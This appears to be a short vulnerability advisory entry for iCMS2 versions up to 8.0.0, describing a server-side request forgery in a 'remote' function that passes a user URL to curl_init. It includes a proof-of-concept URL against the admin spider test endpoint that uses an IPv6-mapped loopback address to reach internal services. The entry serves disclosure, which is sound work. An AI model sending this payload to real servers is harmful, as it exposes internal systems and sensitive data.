### iCMS2

- **Application**: iCMS2<= 8.0.0

- **Threat Impact**: File disclosure, Sensitive data leakage

- **Code**: 

  ```
  public static function remote($url){
    curl_init($url);
  }
  ```

- **POC**:

  1. `http://server/admincp.php?app=spider_project&do=test&url=http://[::ffff:127.0.0.1]`
  1. Receive a request on server side. The response is displayed

